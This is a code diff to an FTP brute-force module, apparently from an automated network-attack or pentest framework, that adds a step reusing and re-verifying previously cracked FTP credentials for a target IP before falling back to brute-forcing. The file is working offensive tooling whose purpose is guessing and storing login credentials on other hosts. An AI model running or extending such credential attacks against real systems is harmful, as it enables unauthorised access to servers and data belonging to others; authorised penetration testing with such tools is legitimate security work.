@@ -9,6 +9,7 @@ from ftplib import FTP
 from queue import Queue
 from shared import SharedData
 from logger import Logger
+from actions.connector_utils import CredentialChecker
 
 logger = Logger(name="ftp_connector.py", level=logging.DEBUG)
 
@@ -36,13 +37,37 @@ class FTPBruteforce:
     def execute(self, ip, port, row, status_key):
         """
         Executes the brute force attack and updates the shared data status.
+        Optimization: Skip bruteforce if valid credentials already exist for this host.
         """
+        logger.info(f"Executing FTPBruteforce on {ip}:{port}...")
+        
+        # Check if we already have valid credentials for this host
+        existing_creds = CredentialChecker.check_existing_credentials(
+            self.shared_data.ftpfile, ip
+        )
+        if existing_creds:
+            logger.info(f"FTP credentials already exist for {ip} - verifying instead of bruteforcing...")
+            # Verify credentials still work
+            if self._verify_credentials(ip, existing_creds):
+                logger.success(f"Existing FTP credentials verified for {ip}: {len(existing_creds)} account(s)")
+                return 'success'
+            else:
+                logger.warning(f"Existing credentials for {ip} no longer valid, will re-bruteforce")
+        
         self.shared_data.ragnarorch_status = "FTPBruteforce"
         # Wait a bit because it's too fast to see the status change
         time.sleep(5)
         logger.info(f"Brute forcing FTP on {ip}:{port}...")
         success, results = self.bruteforce_ftp(ip, port)
         return 'success' if success else 'failed'
+    
+    def _verify_credentials(self, ip, credentials):
+        """Verify that existing credentials still work (quick check)."""
+        for user, password in credentials:
+            if self.ftp_connector.ftp_connect(ip, user, password):
+                logger.debug(f"Verified FTP credential for {ip}: {user}")
+                return True
+        return False
 
 class FTPConnector:
     """
